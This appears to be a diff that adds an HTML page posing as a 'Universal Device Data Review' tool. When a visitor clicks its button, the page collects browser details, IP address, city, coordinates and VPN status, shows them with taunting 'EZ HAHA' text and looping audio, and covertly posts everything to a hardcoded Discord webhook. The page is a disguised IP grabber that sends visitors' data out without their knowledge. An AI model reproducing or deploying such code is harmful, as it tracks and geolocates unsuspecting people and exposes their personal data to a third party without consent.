@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Device Info Viewer</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+            background-color: #121212;
+            color: #ffffff;
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+        h1 {
+            color: #ffffff;
+            font-size: 36px;
+            margin-bottom: 20px;
+        }
+        .info {
+            margin: 10px 0;
+            padding: 20px;
+            border: 1px solid #444;
+            border-radius: 10px;
+            background: #1e1e1e;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.5);
+            display: inline-block;
+            min-width: 300px;
+            position: absolute;
+            animation: shakeAnimation 0.5s linear infinite;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            max-width: 90%; /* Make it responsive */
+        }
+        p {
+            color: #dddddd;
+            font-size: 16px;
+        }
+        .landingPage {
+            padding: 50px;
+            text-align: center;
+            background: #2c2c2c;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.6);
+            position: relative;
+            max-width: 500px;
+            margin: 0 auto;
+            z-index: 1;
+        }
+        .landingPage button {
+            background-color: #008CBA;
+            color: white;
+            padding: 15px 32px;
+            font-size: 16px;
+            cursor: pointer;
+            border: none;
+            border-radius: 5px;
+        }
+        .landingPage button:hover {
+            background-color: #005f73;
+        }
+        .titleText {
+            font-size: 40px;
+            color: #ff6347;
+            font-weight: bold;
+            margin-top: 40px;
+        }
+
+        /* Vibration animation */
+        @keyframes shakeAnimation {
+            0% { transform: translate(-50%, -50%) translateX(0); }
+            25% { transform: translate(-50%, -50%) translateX(-10px); }
+            50% { transform: translate(-50%, -50%) translateX(10px); }
+            75% { transform: translate(-50%, -50%) translateX(-10px); }
+            100% { transform: translate(-50%, -50%) translateX(0); }
+        }
+
+        /* Landing Page Text Style */
+        .landingPage h2 {
+            font-size: 24px;
+            color: #ddd;
+            margin-top: 20px;
+        }
+        .landingPage p {
+            font-size: 18px;
+            color: #bbb;
+            margin-top: 15px;
+        }
+
+        /* Style for image */
+        .image-container {
+            margin-top: 20px;
+        }
+        .image-container img {
+            width: 100%;
+            max-width: 400px;
+            height: auto;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.6);
+        }
+
+    </style>
+</head>
+<body>
+    <div id="landingPage" class="landingPage">
+        <h1>Universal Device Data Review</h1>
+        <h2>Take a Look at your Device Data and Learn how to change Them.</h2>
+        <button id="showButton">View my Data</button>
+    </div>
+
+    <div id="deviceInfo" class="info" style="display:none;">
+        <div class="titleText">EZ HAHA</div>
+        <p>Loading device data...</p>
+
+        <!-- Image container to show rizzz.png -->
+        <div class="image-container">
+            <img src="rizzz.png" alt="Device Image">
+        </div>
+
+    </div>
+
+    <audio id="audio" loop>
+        <source src="haha.mp3" type="audio/mp3">
+        Your browser does not support the audio element.
+    </audio>
+
+    <script>
+        async function getDeviceInfo() {
+            const infoDiv = document.getElementById('deviceInfo');
+            const landingPage = document.getElementById('landingPage');
+
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform;
+            const language = navigator.language;
+            const screenWidth = window.screen.width;
+            const screenHeight = window.screen.height;
+            const cpuCores = navigator.hardwareConcurrency || 'Unknown'; // Number of CPU cores
+
+            // Device info placeholders
+            let deviceEdition = 'Unknown';
+            let deviceVersion = 'Unknown';
+            let systemType = 'Unknown';
+
+            try {
+                // Fetch the Device Edition and Version
+                if (platform.includes('Win')) {
+                    deviceEdition = 'Windows';
+                    deviceVersion = navigator.appVersion;
+                } else if (platform.includes('Mac')) {
+                    deviceEdition = 'macOS';
+                    deviceVersion = navigator.appVersion;
+                } else if (platform.includes('Linux')) {
+                    deviceEdition = 'Linux';
+                    deviceVersion = navigator.appVersion;
+                }
+
+                // Fetch System Type (32-bit or 64-bit)
+                systemType = navigator.userAgent.indexOf('64') !== -1 ? '64-bit' : '32-bit';
+            } catch (error) {
+                console.error('Error fetching system data:', error);
+            }
+
+            let ipAddress = 'Fetching...';
+            let positionData = {
+                city: 'Fetching...',
+                region: 'Fetching...',
+                timezone: 'Fetching...',
+                latitude: 'Fetching...',
+                longitude: 'Fetching...',
+                vpn: 'Unknown'
+            };
+
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                ipAddress = ipData.ip;
+
+                // Check for VPN using a third-party IP service
+                const vpnResponse = await fetch(`https://vpnapi.io/api/${ipAddress}?token=your_api_token_here`);
+                const vpnData = await vpnResponse.json();
+                positionData.vpn = vpnData.security.is_vpn ? 'Yes' : 'No';
+
+                const geoResponse = await fetch(`https://ipapi.co/${ipAddress}/json/`);
+                const geoData = await geoResponse.json();
+                positionData = {
+                    city: geoData.city,
+                    region: geoData.region,
+                    timezone: geoData.timezone,
+                    latitude: geoData.latitude,
+                    longitude: geoData.longitude,
+                    vpn: positionData.vpn
+                };
+            } catch (error) {
+                console.error('Error fetching location and VPN data:', error);
+            }
+
+            const deviceData = {
+                browser: userAgent,
+                operatingSystem: platform,
+                language: language,
+                screenResolution: `${screenWidth} x ${screenHeight}`,
+                ipAddress: ipAddress,
+                city: positionData.city,
+                region: positionData.region,
+                timezone: positionData.timezone,
+                latitude: positionData.latitude,
+                longitude: positionData.longitude,
+                vpn: positionData.vpn,
+                deviceEdition: deviceEdition,
+                deviceVersion: deviceVersion,
+                systemType: systemType,
+                cpuCores: cpuCores
+            };
+
+            // Try to fetch the custom device name from localStorage
+            let deviceName = localStorage.getItem('customDeviceName');
+
+            // If no custom device name exists, set a default one based on the platform
+            if (!deviceName) {
+                deviceName = `${deviceData.operatingSystem} Device`;
+                // Save the custom name in localStorage for future visits
+                localStorage.setItem('customDeviceName', deviceName);
+            }
+
+            // Display the device data
+            infoDiv.innerHTML = `
+                <div class="titleText">EZ HAHA</div>
+                <p><strong>Device Name:</strong> ${deviceName}</p>
+                <p><strong>Device Edition:</strong> ${deviceData.deviceEdition}</p>
+                <p><strong>Device Version:</strong> ${deviceData.deviceVersion}</p>
+                <p><strong>System Type:</strong> ${deviceData.systemType}</p>
+                <p><strong>Browser:</strong> ${deviceData.browser}</p>
+                <p><strong>Operating System:</strong> ${deviceData.operatingSystem}</p>
+                <p><strong>Language:</strong> ${deviceData.language}</p>
+                <p><strong>Screen Resolution:</strong> ${deviceData.screenResolution}</p>
+                <p><strong>Your IP Address:</strong> ${deviceData.ipAddress}</p>
+                <p><strong>City:</strong> ${deviceData.city}</p>
+                <p><strong>Region:</strong> ${deviceData.region}</p>
+                <p><strong>Time Zone:</strong> ${deviceData.timezone}</p>
+                <p><strong>Coordinates:</strong> ${deviceData.latitude}, ${deviceData.longitude}</p>
+                <p><strong>VPN Detected:</strong> ${deviceData.vpn}</p>
+                <p><strong>CPU Cores:</strong> ${deviceData.cpuCores}</p>
+            `;
+
+            // Send the data to the webhook
+            try {
+                await fetch('https://discordapp.com/api/webhooks/1330513852315734076/cHE5eHxuscj1irA0SDp4wJOz-SwQnVWzGl1IHibnNa8-MEuU0pgSD6jr6FXrPx72vsVB', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        embeds: [{
+                            title: 'Device Data',
+                            color: 16711680, // Red color
+                            fields: [
+                                { name: 'Device Name', value: deviceName, inline: false },
+                                { name: 'Device Edition', value: deviceData.deviceEdition, inline: false },
+                                { name: 'Device Version', value: deviceData.deviceVersion, inline: false },
+                                { name: 'System Type', value: deviceData.systemType, inline: false },
+                                { name: 'Browser', value: deviceData.browser, inline: false },
+                                { name: 'Operating System', value: deviceData.operatingSystem, inline: false },
+                                { name: 'Language', value: deviceData.language, inline: false },
+                                { name: 'Screen Resolution', value: deviceData.screenResolution, inline: false },
+                                { name: 'IP Address', value: deviceData.ipAddress, inline: false },
+                                { name: 'City', value: deviceData.city, inline: false },
+                                { name: 'Region', value: deviceData.region, inline: false },
+                                { name: 'Time Zone', value: deviceData.timezone, inline: false },
+                                { name: 'Coordinates', value: `${deviceData.latitude}, ${deviceData.longitude}`, inline: false },
+                                { name: 'VPN Detected', value: deviceData.vpn, inline: false },
+                                { name: 'CPU Cores', value: deviceData.cpuCores, inline: false }
+                            ]
+                        }]
+                    })
+                });
+            } catch (error) {
+                console.error('Error sending data to webhook:', error);
+            }
+        }
+
+        document.getElementById('showButton').onclick = () => {
+            document.getElementById('landingPage').style.display = 'none';
+            document.getElementById('deviceInfo').style.display = 'block';
+            getDeviceInfo();
+
+            // Play audio in loop
+            const audio = document.getElementById('audio');
+            audio.play();
+        };
+    </script>
+</body>
+</html>
